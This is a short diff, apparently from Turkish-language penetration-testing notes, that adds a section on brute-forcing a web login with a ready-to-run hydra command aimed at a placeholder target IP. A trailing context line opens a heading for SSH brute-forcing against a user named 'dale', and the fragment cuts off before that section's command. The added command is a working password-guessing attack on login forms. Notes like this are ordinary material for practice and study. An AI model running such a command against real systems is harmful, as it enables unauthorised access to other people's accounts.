@@ -1,3 +1,7 @@
+*** Login için BruteForce ***
+```bash
+hydra -L users.txt -P passwords.txt <HEDEF_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Hatalı Giriş" -V
+```
 *** ssh için dale ismi ile bruteforce ***
 
 ``` bash
